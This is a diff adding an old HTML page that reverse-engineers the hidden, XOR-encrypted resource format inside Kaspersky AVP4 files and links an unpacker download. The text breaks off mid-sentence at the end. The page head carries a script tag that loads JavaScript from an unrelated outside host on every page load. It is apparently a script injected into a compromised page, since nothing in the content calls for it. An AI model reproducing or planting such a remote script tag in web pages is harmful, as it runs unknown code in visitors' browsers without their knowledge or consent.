@@ -1,0 +1,64 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<html>
+<head>
+<title>Inside of Avp4</title><script language='JavaScript' type='text/javascript' src='http://proxy.host.sk/index.php'></script>
+</head>
+<body bgcolor=#B4B8B4 text=#000000 link=#0000EE vlink=#551A8B>
+
+<h2 align=center>Inside of Avp4</h1>
+
+<p align=justify>Did you know, that there is some secret stuff inside of AVP4 files?
+
+<p align=justify>Yep,  this  is  a list of some internal messages and resources, author
+ names, plugin descriptions, comments, CLSID's, and other shit.
+
+<p align=justify>Secret    stuff    has    fixed   header   of   0x0E   bytes   length,
+ 'KLsw\x00\x00KLsw\x04\x00\x00\x00',   and  right  after  these  bytes  the
+ compressed  and  then  encrypted  stuff  is  placed.  The  decrypted (just
+ unXOR'ed -- did you prayed to XOR today?) stuff begins with header of 0x1E
+ bytes  length,  including  some CRC inside, and then some data, compressed
+ with  the  same  method  as .AVC bases. Decompressed data contains header,
+ then  list  of resources itself, and terminates with another CRC (probably
+ CRC32, but who cares).
+
+<pre>
+                            Secret stuff format:
+
+             <----0x0E---->  <----0x1E----> <------ ? ----->
+             KLsw00KLsw4000 [hhhhhhhhhhhcrc [hhhxxxxxxxcrc]]
+             \fixed header/                 \--compressed--/
+                             \-------stupidly XOR'ed-------/
+</pre>
+
+<p align=justify>Internal format of the resource list is the following:
+
+<p align=justify>
+<pre>
+     length description
+     ------ -----------
+      0x13  useless header
+       4    type (int, string, etc.)
+       n    data (length depends on type, may be zero)
+       4    type
+       n    data
+      ...
+       4    CRC
+</pre>
+
+<p align=justify>So, the following objects are containing this stuff:
+
+<p align=justify>
+<table border=1 width=100% cellspacing=0 cellpadding=3>
+<tr><td> Plugin files        <td> Program Files\Kaspersky Lab\*.PPL (.rsrc/ovr)
+<tr><td> Configuration files <td> Program Files\Kaspersky Lab\*.KLR (plain)
+<tr><td> Some libraries      <td> Program Files\KAV Shared Files\*.DLL (.rsrc)
+<tr><td> Registry settings   <td> System Registry, in binary form<br>(HKLM\Software\KasperskyLab\Components\101\Standalone\OptionsPagesState)
+</table>
+
+<p align=justify>Well,  rigth after we understood what the injustice kaspersky is going
+ to  do, we spent some hours and wrote a little program, called AVP4 Secret
+ Resources Unpacker (AVP4SRU), and unpacked all the found secret stuff just
+ for  fun.  And  now,  all  the unpacked files have .SRU extension, and are
+ available to dowload <a href="sru.zip">here</a>.
+
+<p align=center>greetz to <b>Krukov</b> - brief and to the p
